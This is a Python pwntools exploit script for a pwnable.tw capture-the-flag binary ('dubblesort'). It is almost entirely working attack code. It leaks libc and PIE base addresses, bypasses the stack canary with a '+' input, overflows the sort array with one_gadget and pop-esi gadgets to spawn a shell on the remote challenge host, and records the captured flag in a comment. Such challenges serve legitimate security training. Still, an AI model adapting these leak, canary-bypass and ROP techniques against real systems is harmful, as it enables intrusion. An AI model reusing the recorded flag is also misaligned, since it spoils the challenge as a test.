from pwn import *

#r = process("./D", env={"LD_PRELOAD" : "./libc.so.6"})
r = remote("chall.pwnable.tw","10101")
# leak pie & libc base
r.sendafter(b'name :',b'a'*0x18 + b'cccc')
r.recvuntil(b'cccc')
libc_base = u32(r.recv(4)) - 0x1ae244
pie_base = u32(r.recv(4)) - 0x601
log.info(f'libc base : {hex(libc_base)}')
log.info(f'pie base : {hex(pie_base)}')

### gadget
pop_esi_ret = libc_base + 0x17828  # pop esi ; ret
one_gadget = libc_base + 0x5f065
main = pie_base + 0x9c3   #0x9c3 
pltgot_offset = libc_base + 0x1b0000


### first stack overflow to write one_gadget at ret_address + 0x8 
r.sendlineafter(b'sort :',b'39')
for i in range(23):
    r.sendlineafter(b'number :',str(0).encode())
r.sendlineafter(b'number :',str(23).encode())
r.sendlineafter(b'number :',b'+')   ## canary 
for i in range(7):
    r.sendlineafter(b'number :',str(main).encode())
r.sendlineafter(b'number :',str(main).encode())  # ret address
r.sendlineafter(b'number :',str(main).encode())
for i in range(5) :   
    r.sendlineafter(b'number :',str(one_gadget).encode()) 

### leak canary
r.recvuntil(b"23 ")
canary = int(r.recvuntil(b" ").strip().decode())
log.info(f'canary : {hex(canary)}')

### second stack overflow to write pop_esi ret and set esi to libc gotplt base

log.info('Second Round')
r.sendafter(b'name :',b'0')
r.sendlineafter(b'sort :',b'31')
for i in range(23):
    r.sendlineafter(b'number :',str(0).encode())
r.sendlineafter(b'number :',str(23).encode())
r.sendlineafter(b'number :',b'+')   ## canary 
for i in range(4):
    r.sendlineafter(b'number :',str(main).encode())
r.sendlineafter(b'number :',str(pop_esi_ret).encode())  # ret address
r.sendlineafter(b'number :',str(pltgot_offset).encode())  

# FLAG{Dubo_duBo_dub0_s0rttttttt}

r.interactive()

